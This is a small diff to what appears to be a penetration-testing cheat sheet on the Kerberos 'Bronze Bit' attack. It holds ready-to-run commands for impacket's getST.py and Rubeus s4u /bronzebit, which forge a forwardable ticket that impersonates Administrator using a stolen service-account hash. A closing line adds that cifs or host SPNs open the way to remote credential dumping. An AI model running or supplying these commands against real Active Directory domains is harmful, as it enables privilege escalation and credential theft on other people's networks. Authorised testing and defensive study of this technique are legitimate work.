@@ -12,6 +12,8 @@
 
 ## Exploitation
 
- - getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account
+    getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account
+
+    ./Rubeus.exe s4u /bronzebit /user:<service_account> /rc4:<service_account_hash> /dc:dc.domain.local /impersonateuser:Administrator /domain:domain.local /altservice:cifs/target.domain.local /nowrap
 
 ### The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, cifs/target.domain or host/target.domain will allow most remote dumping operations
